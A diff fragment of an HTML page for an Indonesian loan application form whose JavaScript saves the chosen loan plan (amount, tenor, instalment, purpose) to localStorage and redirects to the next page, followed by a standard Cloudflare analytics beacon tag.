+      // Inisialisasi summary awal dari kartu yang ter-select
+      const initialSelected = document.querySelector('.option-card.selected');
+      if (initialSelected) {
+        updateSummary(initialSelected);
+      }
+
+      // Action saat tombol Lanjutkan Pengajuan diklik
+      if (btnSubmit) {
+        btnSubmit.addEventListener('click', function() {
+          const selectedOption = document.querySelector('.option-card.selected');
+          if (!selectedOption) return;
+
+          const activeChip = document.querySelector('.purpose-chip.active');
+          const loanData = {
+            nominal: selectedOption.getAttribute('data-amount'),
+            tenor: selectedOption.getAttribute('data-tenor') + " Bulan",
+            cicilan: selectedOption.getAttribute('data-cicilan'),
+            tujuan: activeChip ? activeChip.innerText.trim() : 'Modal Usaha'
+          };
+
+          // Animasi klik & simpan ke LocalStorage
+          btnSubmit.style.transform = 'scale(0.97)';
+          setTimeout(function() {
+            try {
+              localStorage.setItem('selectedLoanPlan', JSON.stringify(loanData));
+            } catch (e) {
+              console.log('LocalStorage error:', e);
+            }
+            window.location.href = "main.html";
+          }, 150);
+        });
+      }
+    });
+  </script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;73524a7c28eb4867a24c051e76026475&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>
+
+</body></html>
